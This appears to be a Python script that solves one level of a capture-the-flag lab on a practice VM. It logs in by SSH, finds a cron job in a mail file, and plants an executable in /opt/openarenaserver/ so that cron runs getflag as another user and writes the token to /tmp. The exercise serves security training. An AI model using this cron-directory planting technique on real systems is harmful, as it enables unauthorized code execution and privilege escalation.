import os
import subprocess
import sys
import time

sys.path.append("../..")

from utils.ssh import sanitize_token, connect_by_previous, exec, save_token, VM_ADDRESS, VM_PORT, get_current_level, \
    get_previous_password
from utils.text import print_title, print_output, print_magic

client = connect_by_previous()
command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT}'
dev_null = open(os.devnull, 'w')
stdout = subprocess.Popen(command.split(' '), stdin=dev_null, stderr=dev_null, stdout=subprocess.PIPE)\
    .stdout.readline().decode('utf-8')
print_output(stdout, 'Stdin')
print_title('We receive mail? Check it out')

output = exec(client, 'mail', title='Cast mail client', err=True)
print_output(output, 'Output')
print_title("So sad, mail client not installed, let's go the other way")

file = exec(client, 'ls /var/mail', title='What files in mail dir?')[0]
print_output(file, 'Files list')

file_content = exec(client, f'cat /var/mail/{file}', title='Read this file')[0]
print_output(file_content)
print_title('Crontab rule execute file by user flag05? Check it too')

another_file = file_content.split('"', 1)[1].split('"')[0].replace('sh ', '')
another_file_content = exec(client, f'cat {another_file}', title='Read this file too')
print_output(another_file_content)
print_title('Cycle execute all files in /opt/openarenaserver/ folder, use that')

print_magic('Time to magic, again!!!')
exec(client, 'echo "getflag > /tmp/token" > /opt/openarenaserver/tricky_thing',
     title='Write file to openarenaserver folder, it execute getflag and write output in tmp/token')
exec(client, 'chmod +x /opt/openarenaserver/tricky_thing', title='Make our script executable')

print_title('Wait 2 minutes, until crontab run...')
time.sleep(130)

token_raw = exec(client, 'cat /tmp/token', title='Read new file')[0]
print_output(token_raw)

client.close()
token = sanitize_token(token_raw)
save_token(token)
